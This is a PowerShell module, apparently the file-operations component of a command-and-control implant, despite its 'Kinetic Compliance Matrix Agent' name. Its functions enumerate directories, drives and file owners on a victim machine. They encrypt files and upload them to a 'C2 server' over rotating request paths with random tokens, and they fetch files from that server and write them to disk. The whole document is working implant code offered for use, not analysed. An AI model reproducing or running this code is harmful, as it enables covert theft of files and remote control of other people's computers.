# File Operations Module for Kinetic Compliance Matrix Agent
# This module provides functions for file system navigation, upload, and download

function Get-DirectoryListing {
    <#
    .SYNOPSIS
        Gets directory listing with better formatting for C2 interface
    .DESCRIPTION
        Lists files and folders in the specified directory with detailed information
    .PARAMETER DirectoryPath
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath
    )
    
    try {
        # Expand environment variables if present
        if ($DirectoryPath -match '%\w+%') {
            $DirectoryPath = [System.Environment]::ExpandEnvironmentVariables($DirectoryPath)
        }
        
        # Check if directory exists
        if (-not (Test-Path -Path $DirectoryPath -PathType Container)) {
            return "Error: Directory not found: $DirectoryPath"
        }
        
        # Get items with error handling
        $items = Get-ChildItem -Path $DirectoryPath -Force -ErrorAction SilentlyContinue | 
        Select-Object Name, Length, LastWriteTime, Attributes, @{
            Name = "Type";
            Expression = {
                if ($_.PSIsContainer) { "Directory" } else { "File" }
            }
        }
        
        # Convert to JSON for structured display in C2 interface
        $jsonResult = ConvertTo-Json -InputObject $items -Compress
        return $jsonResult
    }
    catch {
        return "Error listing directory: $_"
    }
}

function Upload-File {
    <#
    .SYNOPSIS
        Uploads a file from server to client
    .DESCRIPTION
        Downloads a file from the C2 server and saves it to the specified path on the client
    .PARAMETER SourcePath
        Path to the file on the server
    .PARAMETER DestinationPath
        Path where the file should be saved on the client
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$SourcePath,
        
        [Parameter(Mandatory=$true)]
        [string]$DestinationPath
    )
    
    try {
        # Expand environment variables if present in destination path
        if ($DestinationPath -match '%\w+%') {
            $DestinationPath = [System.Environment]::ExpandEnvironmentVariables($DestinationPath)
        }
        
        # Create destination directory if it doesn't exist
        $destinationDir = Split-Path -Path $DestinationPath -Parent
        if (-not (Test-Path -Path $destinationDir -PathType Container)) {
            New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
        }
        
        # Prepare request data with properly escaped quotes
        $fileRequest = @{
            FilePath = $SourcePath
            Destination = $DestinationPath
        }

        # Convert to JSON with explicit ConvertTo-Json call
        $requestJson = ConvertTo-Json -InputObject $fileRequest -Compress
        Write-Verbose "Request JSON: $requestJson"
        
        # Create a web client for file request
        $webClient = New-ConfiguredWebClient
        
        # Get current file request path
        $fileRequestPath = if ($global:pathRotationEnabled) { 
            Get-CurrentPath -PathType "file_request_path" 
        } else { 
            "/file_request"  # Default fallback if not defined
        }
        
        # Encrypt the request
        $encryptedRequest = Encrypt-Data -PlainText $requestJson
        
        # Prepare the payload with proper JSON structure
        $payload = @{
            d = $encryptedRequest  # Shortened from 'data'
            t = Get-RandomToken     # Shortened from 'token'
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        # Convert payload to JSON with proper handling
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress -Depth 4
        
        # Send the request
        $requestUrl = "http://$serverAddress$fileRequestPath"
        Write-Host "Sending file request to $requestUrl"
        $response = $webClient.UploadString($requestUrl, $payloadJson)
        
        # Parse the response with proper error handling
        try {
            $responseObj = ConvertFrom-Json -InputObject $response -ErrorAction Stop
            $encryptedData = $responseObj.d
            
            # Decrypt the response
            $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedData
            $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
            
            # Check if file was found
            if ($fileResponse.Status -eq "Error") {
                return "Error: $($fileResponse.Message)"
            }
            
            # Get file content and save it
            $fileContent = [System.Convert]::FromBase64String($fileResponse.FileContent)
            [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
            
            return "Successfully downloaded $($fileResponse.FileName) ($($fileResponse.FileSize) bytes) to $DestinationPath"
        }
        catch {
            return "Error parsing server response: $_"
        }
    }
    catch {
        return "Error uploading file: $_"
    }
}

function Download-File {
    <#
    .SYNOPSIS
        Downloads a file from client to server
    .DESCRIPTION
        Uploads a file from the client to the C2 server
    .PARAMETER FilePath
        Path to the file on the client to upload
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    
    try {
        # Expand environment variables if present
        if ($FilePath -match '%\w+%') {
            $FilePath = [System.Environment]::ExpandEnvironmentVariables($FilePath)
        }
        
        # Check if file exists
        if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
            return "Error: File not found: $FilePath"
        }
        
        # Read file content
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileContent = [System.Convert]::ToBase64String($fileBytes)
        
        # Prepare file upload data
        $fileData = @{
            FileName = (Split-Path -Path $FilePath -Leaf)
            FileContent = $fileContent
            FileSize = $fileBytes.Length
            SourcePath = $FilePath
        }
        
        # Convert to JSON
        $fileDataJson = ConvertTo-Json -InputObject $fileData -Compress
        
        # Encrypt the data
        $encryptedData = Encrypt-Data -PlainText $fileDataJson
        
        # Create a web client for file upload
        $webClient = New-ConfiguredWebClient
        
        # Get current file upload path
        $fileUploadPath = if ($global:pathRotationEnabled) { 
            Get-CurrentPath -PathType "file_upload_path" 
        } else { 
            "/file_upload"  # Default fallback
        }
        
        # Prepare the payload
        $payload = @{
            d = $encryptedData        # Shortened from 'data'
            t = Get-RandomToken       # Shortened from 'token'
        }
        
        # Add client ID only during first contact
        if ($global:firstContact) {
            $payload.c = $global:clientID
        }
        
        $payloadJson = ConvertTo-Json -InputObject $payload -Compress
        
        # Send the upload
        $uploadUrl = "http://$serverAddress$fileUploadPath"
        $response = $webClient.UploadString($uploadUrl, $payloadJson)
        
        return "Successfully uploaded $FilePath to server ($($fileBytes.Length) bytes)"
    }
    catch {
        return "Error downloading file: $_"
    }
}

function Get-FileSystemItems {
    <#
    .SYNOPSIS
        Gets file system items (files and folders) with detailed information
    .DESCRIPTION
        Provides a detailed listing of files and folders in the specified directory
    .PARAMETER Path
        Path to the directory to list
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        # Expand environment variables if present
        if ($Path -match '%\w+%') {
            $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
        }
        
        # Check if directory exists
        if (-not (Test-Path -Path $Path -PathType Container)) {
            return "Error: Directory not found: $Path"
        }
        
        # Get items with error handling
        $itemsInfo = Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $type = if ($_.PSIsContainer) { "Directory" } else { "File" }
            $size = if ($_.PSIsContainer) { "N/A" } else { $_.Length }
            $extension = if ($_.PSIsContainer) { "" } else { $_.Extension }
            
            # Create object with properties
            [PSCustomObject]@{
                Name = $_.Name
                FullPath = $_.FullName
                Type = $type
                Size = $size
                Extension = $extension
                Created = $_.CreationTime
                Modified = $_.LastWriteTime
                Attributes = $_.Attributes.ToString()
                IsHidden = $_.Attributes -band [System.IO.FileAttributes]::Hidden
                IsSystem = $_.Attributes -band [System.IO.FileAttributes]::System
                IsReadOnly = $_.Attributes -band [System.IO.FileAttributes]::ReadOnly
                Owner = (Get-FileOwner -Path $_.FullName)
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $itemsInfo -Depth 3 -Compress
        return $jsonResult
    }
    catch {
        return "Error getting file system items: $_"
    }
}

function Get-FileOwner {
    <#
    .SYNOPSIS
        Gets the owner of a file or directory
    .DESCRIPTION
        Returns the owner of the specified file or directory
    .PARAMETER Path
        Path to the file or directory
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        $acl = Get-Acl -Path $Path -ErrorAction SilentlyContinue
        if ($acl) {
            return $acl.Owner
        } else {
            return "Unknown"
        }
    }
    catch {
        return "Unknown"
    }
}

function Get-DriveInfo {
    <#
    .SYNOPSIS
        Gets information about available drives
    .DESCRIPTION
        Returns detailed information about all available drives
    #>
    try {
        $drives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
            [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Fixed"
                SizeGB = [math]::Round($_.Size / 1GB, 2)
                FreeSpaceGB = [math]::Round($_.FreeSpace / 1GB, 2)
                PercentFree = [math]::Round(($_.FreeSpace / $_.Size) * 100, 2)
            }
        }
        
        # Add removable drives
        Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
            $drives += [PSCustomObject]@{
                DriveLetter = $_.DeviceID
                VolumeName = $_.VolumeName
                DriveType = "Removable"
                SizeGB = if ($_.Size) { [math]::Round($_.Size / 1GB, 2) } else { 0 }
                FreeSpaceGB = if ($_.FreeSpace) { [math]::Round($_.FreeSpace / 1GB, 2) } else { 0 }
                PercentFree = if ($_.Size -gt 0) { [math]::Round(($_.FreeSpace / $_.Size) * 100, 2) } else { 0 }
            }
        }
        
        # Convert to JSON
        $jsonResult = ConvertTo-Json -InputObject $drives -Compress
        return $jsonResult
    }
    catch {
        return "Error getting drive information: $_"
    }
}

function Copy-FileToServer {
    <#
    .SYNOPSIS
        Alias for Download-File to make the direction clearer
    .DESCRIPTION
        Uploads a file from the client to the C2 server
    .PARAMETER FilePath
        Path to the file on the client to upload
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )
    
    return Download-File -FilePath $FilePath
}

function Copy-FileFromServer {
    <#
    .SYNOPSIS
        Alias for Upload-File to make the direction clearer
    .DESCRIPTION
        Downloads a file from the C2 server and saves it to the specified path on the client
    .PARAMETER SourcePath
        Path to the file on the server
    .PARAMETER DestinationPath
        Path where the file should be saved on the client
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$SourcePath,
        
        [Parameter(Mandatory=$true)]
        [string]$DestinationPath
    )
    
    return Upload-File -SourcePath $SourcePath -DestinationPath $DestinationPath
}

# Export functions for use in the agent
Export-ModuleMember -Function Get-DirectoryListing, Upload-File, Download-File, 
                             Get-FileSystemItems, Get-DriveInfo, 
                             Copy-FileToServer, Copy-FileFromServer